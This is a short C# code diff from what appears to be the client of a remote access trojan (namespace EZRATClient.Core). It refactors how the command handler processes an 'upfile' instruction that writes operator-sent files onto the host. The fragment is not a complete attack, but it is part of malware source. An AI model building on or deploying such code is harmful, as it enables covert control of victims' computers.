@@ -132,9 +132,7 @@ namespace EZRATClient.Core
             else if (text.StartsWith("upfile;"))
             {
                 text = text.Substring(7);
-                string[] lines = text.Split(';');
-                string path = lines[0];
-                CommandExecutor.ReceiveFile(lines[1], path);
+                CommandExecutor.ReceiveFile(text);
             }
             else if (text.StartsWith("dtfile;"))
             {
